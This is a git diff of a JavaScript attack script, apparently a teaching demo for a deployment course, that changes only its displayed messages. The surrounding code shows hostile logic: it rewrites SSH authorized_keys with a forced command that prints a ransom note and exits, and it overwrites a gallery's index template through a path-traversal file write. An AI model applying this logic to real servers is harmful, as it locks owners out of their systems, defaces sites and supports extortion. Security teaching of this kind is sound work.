@@ -7,7 +7,7 @@ import { File, FormData } from 'formdata-node';
 
 // Message that will be shown after the hack.
 const hackMessage =
-  'You have been h4ck3d. Send all your bitcoins to show-me-the-money@archidep.tech if you want your server back.';
+  'You have been h4ck3d (ㆆ _ ㆆ) Send all your bitcoins to show-me-the-money@example.com if you want your server back.';
 
 // Template that will be used for the hacked index page of the gallery.
 const hackedIndexPageTemplate = template(`
@@ -110,7 +110,7 @@ async function hackAuthorizedKeys(homeDir, publicKey) {
     `${hackedAuthorizedKeys.map(formatAuthorizedKey).join('\n')}\n`
   );
 
-  console.warn(chalk.magenta(`H4ck3d!`));
+  console.warn(chalk.magenta(`Authorized keys (ㆆ _ ㆆ)`));
 }
 
 /**
@@ -120,13 +120,13 @@ async function hackGalleryIndexPage() {
   await writeFileWithImageGallery(
     '/../views/index.pug',
     hackedIndexPageTemplate({
-      title: 'H4ck3d!',
+      title: '(ㆆ _ ㆆ)',
       text: hackMessage
     })
   );
 
   console.warn();
-  console.warn(chalk.magenta(`Index page h4ck3d!`));
+  console.warn(chalk.magenta(`Index page (ㆆ _ ㆆ)`));
 }
 
 /**
@@ -270,8 +270,8 @@ function hackAuthorizedKey({ algorithm, key, comment }) {
     algorithm,
     key,
     comment: compact([
-      comment ? comment.replace(' (h4ck3d)', '') : undefined,
-      '(h4ck3d)'
+      comment ? comment.replace(' (ㆆ _ ㆆ)', '') : undefined,
+      '(ㆆ _ ㆆ)'
     ]).join(' '),
     options: `no-port-forwarding,no-agent-forwarding,no-X11-forwarding,command="echo;echo '${hackMessage}';echo;exit 42"`
   };
